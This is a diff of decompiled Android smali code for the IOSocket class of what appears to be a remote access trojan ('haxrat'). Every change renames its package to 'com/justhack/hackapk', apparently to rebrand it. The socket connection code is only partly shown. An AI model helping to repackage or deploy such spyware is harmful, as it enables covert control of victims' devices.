@@ -1,10 +1,10 @@
-.class public Lcom/hax4us/haxrat/IOSocket;
+.class public Lcom/justhack/hackapk/IOSocket;
 .super Ljava/lang/Object;
 .source "IOSocket.java"
 
 
 # static fields
-.field private static ourInstance:Lcom/hax4us/haxrat/IOSocket;
+.field private static ourInstance:Lcom/justhack/hackapk/IOSocket;
 
 
 # instance fields
@@ -15,7 +15,7 @@
 .method static final constructor <clinit>()V
     .locals 5
 
-    new-instance v2, Lcom/hax4us/haxrat/IOSocket;
+    new-instance v2, Lcom/justhack/hackapk/IOSocket;
 
     move-object v4, v2
 
@@ -23,9 +23,9 @@
 
     move-object v3, v4
 
-    invoke-direct {v3}, Lcom/hax4us/haxrat/IOSocket;-><init>()V
+    invoke-direct {v3}, Lcom/justhack/hackapk/IOSocket;-><init>()V
 
-    sput-object v2, Lcom/hax4us/haxrat/IOSocket;->ourInstance:Lcom/hax4us/haxrat/IOSocket;
+    sput-object v2, Lcom/justhack/hackapk/IOSocket;->ourInstance:Lcom/justhack/hackapk/IOSocket;
 
     return-void
 .end method
@@ -43,7 +43,7 @@
 
     .line 18
     :try_start_0
-    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/justhack/hackapk/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v5
 
@@ -278,7 +278,7 @@
 
     move-result-object v6
 
-    iput-object v6, v5, Lcom/hax4us/haxrat/IOSocket;->ioSocket:Lio/socket/client/Socket;
+    iput-object v6, v5, Lcom/justhack/hackapk/IOSocket;->ioSocket:Lio/socket/client/Socket;
     :try_end_0
     .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -300,12 +300,12 @@
     goto :goto_0
 .end method
 
-.method public static getInstance()Lcom/hax4us/haxrat/IOSocket;
+.method public static getInstance()Lcom/justhack/hackapk/IOSocket;
     .locals 3
 
     .prologue
     .line 32
-    sget-object v2, Lcom/hax4us/haxrat/IOSocket;->ourInstance:Lcom/hax4us/haxrat/IOSocket;
+    sget-object v2, Lcom/justhack/hackapk/IOSocket;->ourInstance:Lcom/justhack/hackapk/IOSocket;
 
     move-object v0, v2
 
@@ -323,7 +323,7 @@
 
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/IOSocket;->ioSocket:Lio/socket/client/Socket;
+    iget-object v2, v2, Lcom/justhack/hackapk/IOSocket;->ioSocket:Lio/socket/client/Socket;
 
     move-object v0, v2
 
